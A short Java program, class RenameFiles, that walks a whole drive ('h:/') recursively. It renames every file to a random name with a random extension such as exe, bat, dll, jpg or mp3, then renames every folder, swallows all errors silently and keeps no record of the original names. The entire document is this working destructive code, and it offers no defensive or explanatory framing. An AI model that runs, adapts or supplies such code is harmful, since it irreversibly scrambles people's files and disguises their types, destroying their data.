package mypack;

import java.io.File;
import java.util.Random;

public class RenameFiles
{
	static String generateName()
	{
		String name="";
		Random r=new Random();
		byte len;
		do{
			len=(byte)r.nextInt(13);
		}while(len<6);
		
		for(byte i=1;i<=len;i++)
		{
			char ch;
			do{
				ch=(char)r.nextInt(91);
			}while(ch<65);
			
			name=name+ch;
		}
		
		return name;
	}
	
	static String generateExt()
	{
		String ext[]={"exe","bat","dll","data","jpg","gif","png","tiff","ico","mp3","mp4","avi","mpeg","wav"};
		Random r=new Random();
		byte index=(byte)r.nextInt(ext.length);
		return ext[index];
	}
	
	static void renamefile(File file)
	{
		File files[]=file.listFiles();
		try{
			for(File f : files)
			{
				if(f.isFile())
				{
					try{
					String name=generateName();
					String ext=generateExt();
					String file_name=name+"."+ext;
					String parent=f.getParent();
					String new_name=parent+"/"+file_name;
					f.renameTo(new File(new_name));
					}
					catch(Exception e){}
				}
			}
		}
		catch(Exception e){}
		try{
			for(File f : files)
			{
				if(f.isDirectory())
					renamefile(f);
			}
		}
		catch(Exception ex){}
		String folder_name=generateName();
		String folder_parent=file.getParent();
		String folder_new=folder_parent+"\\"+folder_name;
		file.renameTo(new File(folder_new));
	}
	public static void main(String[] args)
	{
		File f =new File("h:/");
		System.out.println("Working...");
		renamefile(f);
		System.out.println("Completed");
	}
}